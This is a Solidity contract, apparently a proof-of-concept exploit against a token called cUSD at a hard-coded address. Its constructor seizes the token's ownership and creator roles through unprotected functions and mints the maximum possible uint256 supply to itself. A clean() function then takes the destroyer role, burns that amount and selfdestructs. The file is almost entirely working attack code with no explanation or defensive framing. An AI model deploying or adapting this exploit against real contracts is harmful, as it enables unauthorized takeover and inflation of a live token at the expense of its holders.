//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

interface IcUSD {
    function transferOwnership(address newOwner) external;

    function setCreator(address _creator) external;

    function mint(address _to, uint256 _amount) external returns (bool);

    function finishMinting() external returns (bool);

    function destroyer() external returns (address);

    function setDestroyer(address _destroyer) external;

    function burn(uint256 _amount) external;
}

contract Chaos_cUSD {

    IcUSD constant cUSD = IcUSD(0x5C406D99E04B8494dc253FCc52943Ef82bcA7D75);

    uint256 constant moneybag = 115792089237316195423570985008687907853269984665640564039457580007913129639935;
    
    constructor () {
        cUSD.transferOwnership(address(this));

        cUSD.setCreator(address(this));

        cUSD.mint(address(this), moneybag);

        cUSD.finishMinting();
    }

    function clean() public {
        if (address(this) != cUSD.destroyer()) {
            cUSD.setDestroyer(address(this));
        }
        cUSD.burn(moneybag);

        selfdestruct(payable(msg.sender));
    }
}